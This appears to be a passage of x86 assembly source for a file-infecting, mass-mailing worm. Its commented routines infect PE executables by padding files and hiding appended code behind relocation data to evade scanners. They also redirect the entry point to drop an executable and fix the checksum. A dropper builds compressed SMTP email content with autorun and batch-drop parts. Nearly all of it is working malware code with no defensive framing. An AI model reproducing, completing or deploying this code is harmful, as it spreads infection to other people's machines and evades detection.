   ;determine platform and dynamically select function types (ANSI or Unicode)
   ;-----------------------------------------------------------------------------

   get_krnapis     proc    near                    ;place near to jump table for smaller code
           call    cGetVersion

   krnapi_delta    label   near
           shr     eax, 1fh
           mov     ecx, dword ptr [esp - 4]        ;no stack change in ring 3
           mov     ecx, dword ptr [ecx + offset store_krnapi - offset krnapi_delta + 3]
           lea     ebp, dword ptr [eax * 4 + ecx]
           ret
   get_krnapis     endp

   ;-----------------------------------------------------------------------------
   ;indexed API jump table
   ;-----------------------------------------------------------------------------

   clstrcatW               proc    near
           push    (krncrcstk.klstrcatW - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   clstrcatW               endp

   cSleep                  proc    near
           push    (krncrcstk.kSleep - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cSleep                  endp

   cSetCurrentDirectoryA   proc    near
           push    (krncrcstk.kSetCurrentDirectoryA - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cSetCurrentDirectoryA   endp

   cLoadLibraryA           proc    near
           push    (krncrcstk.kLoadLibraryA - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cLoadLibraryA           endp

   cGlobalFree             proc    near
           push    (krncrcstk.kGlobalFree - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cGlobalFree             endp

   cGlobalAlloc            proc    near
           push    (krncrcstk.kGlobalAlloc - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cGlobalAlloc            endp

   cGetVersion             proc    near
           push    (krncrcstk.kGetVersion - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cGetVersion             endp

   cCreateThread           proc    near
           push    (krncrcstk.kCreateThread - krncrcstk.klstrlenW) shr 2
           jmp     call_krncrc
   cCreateThread           endp

   cCloseHandle            proc    near
           push    (krncrcstk.kCloseHandle - krncrcstk.klstrlenW) shr 2
   cCloseHandle            endp

   call_krncrc     proc    near
           pop     eax

   store_krnapi    label   near
           jmp     dword ptr [eax * 4 + '!bgr']
   call_krncrc     endp

   ;-----------------------------------------------------------------------------
   ;infect file in two parts
   ;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
   ;               bytes) to confuse scanners that look at end of file (also
   ;               infection marker)
   ;               if reloc table is not in last section (taken from relocation
   ;               field in PE header, not section name), then append to last
   ;               section.  otherwise, move relocs down and insert code into
   ;               space (to confuse people looking at end of file.  they will
   ;               see only relocation data and garbage or many zeroes)
   ;               entry point is altered to point to some code.  very simple
   ;               however, that code just drops exe and returns
   ;               exe contains infection routine
   ;-----------------------------------------------------------------------------

   infect_file     label   near                    ;esi -> findlist, edi = map view
           call    open_append
           push    ecx
           push    edi
           mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
           lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
           xor     ecx, ecx
           imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
           add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
           lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
           lods    dword ptr [esi]
           mov     cx, offset junkmail_codeend - offset junkmail_inf
           mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
           push    eax
           add     eax, ecx
           dec     edx
           add     eax, edx
           not     edx
           and     eax, edx                        ;file align last section
           mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

   ;-----------------------------------------------------------------------------
   ;raw size is file aligned.  virtual size is not required to be section aligned
   ;so if old virtual size is larger than new raw size, then size of image does
   ;not need to be updated, else virtual size must be large enough to cover the
   ;new code, and size of image is section aligned
   ;-----------------------------------------------------------------------------

           mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
           cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
           jnb     test_reloff
           mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
           add     eax, ebp
           mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
           dec     edx
           add     eax, edx
           not     edx
           and     eax, edx
           mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

   ;-----------------------------------------------------------------------------
   ;if relocation table is not in last section, then append to last section
   ;otherwise, move relocations down and insert code into space
   ;-----------------------------------------------------------------------------

   test_reloff     label   near
           test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
           jne     copy_code
           cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
           jb      copy_code
           mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
           add     eax, ebp
           cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
           jnb     copy_code
           add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
           pop     eax
           push    esi
           add     edi, dword ptr [esi]
           lea     esi, dword ptr [edi + eax - 1]
           lea     edi, dword ptr [esi + ecx]
           xchg    ecx, eax
           std
           rep     movs byte ptr [edi], byte ptr [esi]
           cld
           pop     esi
           pop     edi
           push    edi
           push    ecx
           xchg    ecx, eax

   copy_code       label   near
           pop     edx
           add     ebp, edx
           xchg    ebp, eax
           add     edx, dword ptr [esi]
           add     edi, edx
           mov     esi, expsize + 401000h
           rep     movs byte ptr [edi], byte ptr [esi]

   ;-----------------------------------------------------------------------------
   ;alter entry point
   ;-----------------------------------------------------------------------------

           xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], eax
           sub     eax, offset host_patch - offset junkmail_inf + 5
           sub     eax, dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum]
           mov     dword ptr [edi + offset host_patch - offset junkmail_codeend + 1], eax
           pop     edi

   ;-----------------------------------------------------------------------------
   ;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
   ;-----------------------------------------------------------------------------

           xchg    dword ptr [ebx], ecx
           jecxz   infect_ret
           xor     eax, eax
           pop     ecx
           push    ecx
           inc     ecx
           shr     ecx, 1
           clc

   calc_checksum   label   near
           adc     ax, word ptr [edi]
           inc     edi
           inc     edi
           loop    calc_checksum
           pop     dword ptr [ebx]
           adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD

   infect_ret      label   near
           int     3                               ;common exit using SEH
           db      "*4U2NV*"                       ;that is, unless you're reading this
   test_infect     endp

   regdll  db      "advapi32", 0                   ;place < 80h bytes from end for smaller code

   mail_recip      label   near                    ;virtual buffer, 80h bytes
           db      "'"                             ;address sentinel - do not remove!

   junkmail_codeend        label   near
   junkmail_inf    endp

   endif

   .code
   dropper         label   near
           push    (offset part37 - offset smtp1 + 1)
           push    GMEM_FIXED
           call    GlobalAlloc
           push    eax
           mov     esi, offset smtp1
           xchg    edi, eax
           call    compmain                        ;smtp1
           call    compmain                        ;smtp2
           call    compmain                        ;smtp3
           call    compmain                        ;smtp4
           call    compmain                        ;header1
           call    compmain                        ;header2
           call    compmain                        ;subject1
           call    compmain                        ;header31
           call    compmain                        ;header32

   ife compress_only

           lea     eax, dword ptr [edi + offset email_block - offset junkmail_inf + expsize + 401000h]
           pop     ecx
           push    ecx
           sub     eax, ecx
           mov     dword ptr [offset patch_type + 1], eax

   endif

           call    compmain                        ;part11
           call    compmain                        ;part12
           call    compmain                        ;part13
           call    compmain                        ;body1
           call    compmain                        ;part21

   ife compress_only

           lea     eax, dword ptr [edi + offset email_block - offset junkmail_inf + expsize + 401000h]
           pop     ecx
           push    ecx
           sub     eax, ecx
           mov     dword ptr [offset patch_encode + 1], eax

   endif

           call    compmain                        ;part22
           call    compmain                        ;part23
           call    compmain                        ;part24
           call    compmain                        ;autorun
           call    compmain                        ;part31
           call    compmain                        ;suffix1
           call    compmain                        ;suffix2
           call    compmain                        ;part32
           call    compmain                        ;part33
           call    compmain                        ;part34
           call    compmain                        ;batdrop1
           call    compmain                        ;part35
           call    compmain                        ;part36

   if compress_only

           pop     esi
           push    (offset part37 - offset smtp1 + 1) * 7
           push    GMEM_FIXED
           call    GlobalAlloc
           push    eax
           push    esi
           mov     ecx, edi
           sub     ecx, esi
           xchg    edi, eax
           jmp     dump_line

   dump_outer      label   near
           mov     al, ','
           stos    byte ptr [edi]
           test    cl, 0fh
           jne     dump_inner
           dec     edi

   dump_line       label   near
           mov     eax, ("bd" shl 10h) + 0a0dh
           stos    dword ptr [edi]

   dump_inner      label   near
           mov     ax, "0 "
           stos    word ptr [edi]
           lods    byte ptr [esi]
           aam     10h
           call    byt2asc
           mov     al, 'h'
           stos    byte ptr [edi]
           loop    dump_outer
           call    GlobalFree
           xor     ebp, ebp
           push    ebp
           push    ebp
           push    CREATE_ALWAYS
           push    ebp
           push    ebp
           push    GENERIC_WRITE
           push    offset fn_dump
           call    CreateFileA
           xchg    ebx, eax
           pop     eax
           push    eax
           push    eax
           push    esp
           sub     edi, eax
           push    edi
           push    eax
           push    ebx
           call    WriteFile
           push    ebx
           call    CloseHandle
           call    GlobalFree
           xor     ebx, ebx
           push    ebx
           push    offset txttitle
           push    offset txtbody
           push    ebx
           call    MessageBoxA
           push    ebx
           call    ExitProcess

   fn_dump         db      "email.inc", 0

   byt2asc         proc    near
           call    nyb2asc

   nyb2asc         proc    near
           xchg    ah, al
           cmp     al, 0ah
           sbb     al, 69h
           das
           stos    byte ptr [edi]
           ret
   nyb2asc         endp
   byt2asc         endp

   else

           call    GlobalFree
           mov     edx, expcrc_count
           mov     ebx, offset expnames
           mov     edi, offset expcrcbegin
           call    create_crcs
           mov     edx, regcrc_count
           mov     ebx, offset regnames
           mov     edi, offset regcrcbegin
           call    create_crcs
           mov     edx, execrc_count
           mov     ebx, offset exenames
           mov     edi, offset execrcbegin
           call    create_crcs
           mov     edx, usrcrc_count
           mov     ebx, offset usrnames
           mov     edi, offset usrcrcbegin
           call    create_crcs
           mov     edx, svccrc_count
           mov     ebx, offset svcnames
           mov     edi, offset svccrcbegin
           call    create_crcs
           mov     edx, krncrc_count
           mov     ebx, offset krnnames
           mov     edi, offset krncrcbegin
           call    create_crcs
           mov     edx, sfccrc_count
           mov     ebx, offset sfcnames
           mov     edi, offset sfccrcbegin
           call    create_crcs
           mov     edx, ws2crc_count
           mov     ebx, offset ws2names
           mov     edi, offset ws2crcbegin
           call    create_crcs
           mov     edx, netcrc_count
           mov     ebx, offset netnames
           mov     edi, offset netcrcbegin
           call    create_crcs
           mov     edx, ip9xcrc_count
           mov     ebx, offset ip9xnames
           mov     edi, offset ip9xcrcbegin
           call    create_crcs
           mov     edx, ipntcrc_count
           mov     ebx, offset ipntnames
           mov     edi, offset ipntcrcbegin
           call    create_crcs
           call    patch_host
           xor     ebx, ebx
           push    ebx
           push    offset txttitle
           push    offset txtbody
           push    ebx
           call    MessageBoxA
           push    ebx
           call    ExitProcess

   create_crcs     proc    near
           imul    ebp, edx, 4

   create_loop     label   near
           or      eax, -1

   create_outer    label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   create_inner    label   near
           add     eax, eax
           jnb     create_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   create_skip     label   near
           loop    create_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      create_outer
           push    eax
           dec     edx
           jne     create_loop
           mov     eax, esp
           push    ecx
           push    ebp
           push    eax
           push    edi
           call    GetCurrentProcess
           push    eax
           xchg    esi, eax
           call    WriteProcessMemory
           add     esp, ebp
           ret
   create_crcs     endp

   endif

   compcall        proc    near
           js      compmain
           call    compress

   compmain        label   near
           xor     eax, eax
           lods    byte ptr [esi]
           stos    byte ptr [edi]
           test    al, al
           jne     compcall
           ret
   compcall        endp

   ;-----------------------------------------------------------------------------
   ;4/5-bit text compressor by RT Fishel, based on algorithm by qkumba in 1986!
   ;compresses A-Z, a-z, 0-9, 3 user characters, lookup table for more characters
   ;fits 66 characters into 5 bits.  qkumba coding makes it possible ;)
   ;-----------------------------------------------------------------------------

   compress        proc    near                    ;al -> src length, esi -> src buffer, edi -> dst buffer
           xchg    ebx, eax
           mov     bh, 5
           mov     cx, ('A' shl 8) + 16
           xor     ebp, ebp

   comploop        label   near
           lods    byte ptr [esi]
           push    1bh                             ;base switch
           pop     edx
           cmp     al, user1
           je      compuser123
           cmp     al, user2
           je      compuser123
           cmp     al, user3
           je      compuser123
           push    ecx
           push    edi
           push    offset usertable_e - offset usertable
           pop     ecx
           mov     ah, cl
           mov     edi, offset usertable
           repne   scas byte ptr [edi]
           mov     al, cl
           pop     edi
           pop     ecx
           je      compuser5
           dec     esi
           lods    byte ptr [esi]

   ;-----------------------------------------------------------------------------
   ;set case before switching base to alphabetic to save 1 bit
   ;-----------------------------------------------------------------------------

           mov     ah, al
           test    al, 'A' - 1
           je      compnumer
           and     al, 'a' - 1
           inc     eax
           cmp     ch, al
           je      compalpha
           mov     ch, al
           push    edx
           dec     edx                             ;case switch
           call    compstore
           pop     edx

   compalpha       label   near
           sub     ah, al

   compnumer       label   near

   ;-----------------------------------------------------------------------------
   ;check if base switch is required
   ;-----------------------------------------------------------------------------

           shr     al, 6
           add     al, 4
           cmp     bh, al
           je      compextend
           call    compstore                       ;store base switch
           xor     bh, 1

   compextend      label   near
           movzx   edx, ah

   compuser1       label   near
           call    compstore                       ;store character

   comptest        label   near
           dec     bl
           jne     comploop
           ret

   compuser123     label   near

   ;-----------------------------------------------------------------------------
   ;if base is alphabetic and bytes left and next character is numeric, then
   ;switch base to numeric before storing user char to save 1 bit
   ;-----------------------------------------------------------------------------

           cmp     bh, 5
           jne     compchar
           cmp     bl, 1
           je      compchar                        ;no bytes left
           cmp     byte ptr [esi], '0'
           jb      compchar
           cmp     byte ptr [esi], '9'
           jnbe    compchar
           call    compstore                       ;store base switch
           mov     bh, 4

   compchar        label   near
           push    1dh                             ;user1
           pop     edx
           cmp     al, user1
           je      compuser1
           inc     edx                             ;user2
           cmp     al, user2
           je      compuser1
           inc     edx                             ;user3
           jmp     compuser1

   compuser5       label   near
           sub     ah, al

   ;-----------------------------------------------------------------------------
   ;if base is numeric, and char is out of numeric range, then switch base to
   ;alphabetic, store char, then restore base unless next char is alphabetic
   ;-----------------------------------------------------------------------------

           push    edx
           xor     al, al
           cmp     bh, 4
           jne     compindex
           cmp     ah, 0fh
           jbe     compindex
           inc     eax
           call    compstore                       ;store base switch
           mov     bh, 5

   compindex       label   near
           push    1ch                             ;user 5 (lookup table)
           pop     edx
           call    compstore
           movzx   edx, ah
           call    compstore                       ;store character
           pop     edx
           test    al, al
           je      comptest
           cmp     bl, al
           je      comptest                        ;no bytes left
           mov     al, byte ptr [esi]
           cmp     al, 'A'
           jb      comprestore
           and     al, not ' '
           cmp     al, 'Z'
           jbe     comptest

   comprestore     label   near
           call    compstore                       ;store base switch
           mov     bh, 4
           jmp     comptest

   compstore       proc    near
           and     dl, 1fh
           push    ebx
           cmp     bl, 1
           jne     compstmask
           cmp     dl, 1ah
           jb      compstmask
           cmp     dl, 1dh
           adc     bl, 0                           ;avoid flush for multibyte

   compstmask      label   near
           cmp     bh, 5
           je      compstoreb
           and     dl, 0fh

   compstoreb      label   near
           sub     cl, bh
           shl     edx, cl
           or      ebp, edx
           cmp     cl, 8
           jnbe    compsttest

   compstflush     label   near
           xchg    ebp, eax
           xchg    ah, al
           stos    byte ptr [edi]
           xor     al, al
           xchg    ebp, eax
           add     cl, 8

   compsttest      label   near
           cmp     bl, 1
           jne     compstret
           cmp     cl, 10h
           jb      compstflush                     ;force flush low byte

   compstret       label   near
           pop     ebx
           ret
   compstore       endp
   compress        endp
   end             dropper
